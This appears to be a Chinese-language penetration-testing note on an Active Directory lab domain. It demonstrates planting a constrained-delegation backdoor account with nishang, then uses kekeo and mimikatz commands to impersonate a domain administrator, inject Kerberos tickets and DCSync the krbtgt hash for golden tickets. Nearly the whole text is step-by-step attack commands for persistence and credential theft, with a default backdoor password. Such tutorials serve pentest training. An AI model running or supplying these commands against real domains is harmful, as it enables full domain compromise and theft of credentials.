	http://192.168.0.107/ps/nishang/ActiveDirectory/Add-ConstrainedDelegationBackdoor.ps1
	新增一个受限委派服务账户，或添加受限委派后门功能给一个已知账户密码存在的服务账户。
	需运行在域控制器上，本次演示的是新建后门账户，若是给已知账户密码的服务账户添加功能，步骤一致。
	PS > Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain zone.com -AllowedToDelegateTo ldap/dc.zone.com
	密码默认为Password@123!可以修改脚本中$Password参数修改密码。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/561.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/562.png)

	https://github.com/samratashok/ADModule
	导入ADModule中的Microsoft.ActiveDirectory.Management.dll和Import-ActiveDirectory.ps1
	>Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
	>Import-Module Import-ActiveDirectory.ps1
	现以域内普通用户y登录一台域内机器sub2k8，使用kekeo获取TGT
	Kekeo#tgt::ask /user:backdoor /domain:zone.com /password:Passowrd@123!
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/563.png)

	Kekeo#tgs::s4u /tgt:TGT_backdoor@ZONE.COM_krbtgt~zone.com@ZONE.COM.kirbi /user:godadmin@zone.com /service:ldap/dc.zone.com获取以域管理身份访问ldap的TGS 
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/564.png)

	使用mimikatz写入TGS票据
	mimikatz#kerberos::ptt C:\Users\y.ZONE\Desktop\kekeo\x64\TGS_godadmin@zone.com@ZONE.COM_ldap~dc.zone.com@ZONE.COM.kirbi
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/565.png)

	接下来就可以dcsync导出krbtgt的hash，通过krbtgt伪造黄金票据
	mimikatz#lsadump::dcsync /user:krbtgt /domain:zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/566.png)